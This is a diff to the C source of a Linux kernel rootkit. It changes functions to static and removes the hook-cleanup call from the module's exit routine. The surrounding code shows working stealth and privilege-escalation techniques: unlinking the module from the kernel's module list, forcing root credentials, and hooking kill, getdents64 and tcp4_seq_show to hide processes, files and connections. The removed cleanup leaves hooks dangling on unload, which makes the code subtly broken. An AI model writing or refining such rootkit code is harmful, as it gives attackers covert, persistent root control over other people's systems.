@@ -41,20 +41,20 @@ static struct hidden_pid* find_hidden_pid(const char *name) {
     return NULL;
 }
 
-void hideme(void) {
+static void hideme(void) {
     if (hidden) return;
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     hidden = 1;
 }
 
-void showme(void) {
+static void showme(void) {
     if (!hidden) return;
     list_add(&THIS_MODULE->list, prev_module);
     hidden = 0;
 }
 
-void set_root(void) {
+static void set_root(void) {
     struct cred *root = prepare_creds();
     if (!root) return;
     root->uid.val = root->gid.val = 0;
@@ -77,7 +77,7 @@ static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
 }
 
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
-asmlinkage int hook_kill(const struct pt_regs *regs) {
+static asmlinkage int hook_kill(const struct pt_regs *regs) {
     pid_t pid = (pid_t)regs->di;
     int sig = (int)regs->si;
     char buf[NAME_MAX];
@@ -129,7 +129,7 @@ asmlinkage int hook_kill(const struct pt_regs *regs) {
 }
 
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
-asmlinkage int hook_getdents64(const struct pt_regs *regs) {
+static asmlinkage int hook_getdents64(const struct pt_regs *regs) {
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
     struct linux_dirent64 *kdirent, *current_dir, *prev = NULL;
     int ret = orig_getdents64(regs);
@@ -179,7 +179,6 @@ static int __init rootkit_init(void) {
 
 static void __exit rootkit_exit(void) {
     struct hidden_pid *entry, *tmp;
-    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
         list_del(&entry->list);
         kfree(entry);
